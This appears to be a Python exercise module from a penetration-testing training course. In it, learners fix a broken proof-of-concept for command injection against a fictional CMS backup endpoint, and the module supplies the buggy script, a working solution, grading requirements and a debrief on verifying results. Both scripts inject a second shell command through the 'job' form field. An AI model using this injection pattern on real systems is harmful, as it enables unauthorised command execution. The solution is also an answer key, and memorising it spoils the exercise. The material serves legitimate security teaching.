"""salvage defect class 9: it says it worked.

The most expensive defect in the set, because there is no traceback, no error
code and no obvious symptom. The script prints a success line it computed from
nothing at all, and you carry on believing you have a foothold.

crux is the target here, so it can contradict the script directly: the screen
shows what actually arrived while the script is still claiming otherwise.
"""

from __future__ import annotations

from ...model import SalvageBody, Scenario
from ...targets._hits import Requirement

BROKEN = r'''#!/usr/bin/env python3
# Wexler CMS 2.1 - backup job command injection
import urllib.parse
import urllib.request

TARGET = "{{URL}}"
INJECT = "nightly;id"

def main():
    data = urllib.parse.urlencode({"job": INJECT, "keep": "7"}).encode()
    req = urllib.request.Request(TARGET + "/admin/backup")

    try:
        urllib.request.urlopen(req)
    except Exception:
        pass

    print("[+] Success! backup job created with injected command")

if __name__ == "__main__":
    main()
'''

SOLUTION = r'''#!/usr/bin/env python3
# Wexler CMS 2.1 - backup job command injection
import urllib.parse
import urllib.request
import urllib.error

TARGET = "{{URL}}"
INJECT = "nightly;id"

def main():
    data = urllib.parse.urlencode({"job": INJECT, "keep": "7"}).encode()
    req = urllib.request.Request(TARGET + "/admin/backup", data)

    try:
        body = urllib.request.urlopen(req).read().decode()
    except urllib.error.HTTPError as e:
        body = e.read().decode()

    print("[*] response: " + body)
    if "CRUX-LANDED" in body:
        print("[+] landed")
    else:
        print("[-] no: the server did not accept it")

if __name__ == "__main__":
    main()
'''

SCENARIOS = [
    Scenario(
        id='salvage-silent', track='salvage', tier='verified', order=90,
        title='It prints Success and nothing happened',
        waypoint='shell-verify', hone=('python',),
        source='PEN-200 Playbook/04 - Phase 4 - Initial Foothold (Web).md',
        body=SalvageBody(
            brief='The backup endpoint on Wexler CMS 2.1 splices its `job` '
                  'parameter into a shell command. This proof-of-concept '
                  'reports success every time it is run. Find out whether it '
                  'is telling the truth, and make it true.',
            filename='wexler_backup.py',
            cve='CVE-2020-14882', models='Oracle WebLogic',
            real_note=(
                'The WebLogic RCE PoCs are infamous for printing a success '
                'banner whether or not the request landed. Verify the effect on '
                "the target, never the script's own report."
            ),
            defects=('the request body is built and never sent',
                     'a bare except swallows the failure',
                     'the success line is unconditional'),
            route='/admin/backup',
            reject_code=400,
            reject_message='job parameter required',
            broken=BROKEN, solution=SOLUTION,
            requirements=(
                Requirement('a POST', 'method', 'POST',
                            hint='the request arrived as a GET, because no '
                                 'body was ever attached to it'),
                Requirement('the backup endpoint', 'route', '/admin/backup',
                            hint='nothing arrived at /admin/backup'),
                Requirement('the injected job', 'form', 'nightly;id',
                            key='job',
                            hint='no job parameter arrived at all'),
            ),
            debrief='Three habits in one script, and each one hides the next. '
                    '`data` was built and never passed, so `urllib` sent a '
                    'GET. A bare `except` swallowed whatever went wrong. And '
                    'the success line was a `print`, not a conclusion. '
                    '**Never trust a script report of its own work: verify '
                    'the effect, not the message.** The tell was on the '
                    'screen the whole time, because the target counted one '
                    'request and one condition met while the script was '
                    'claiming a foothold.',
        ),
    ),
]
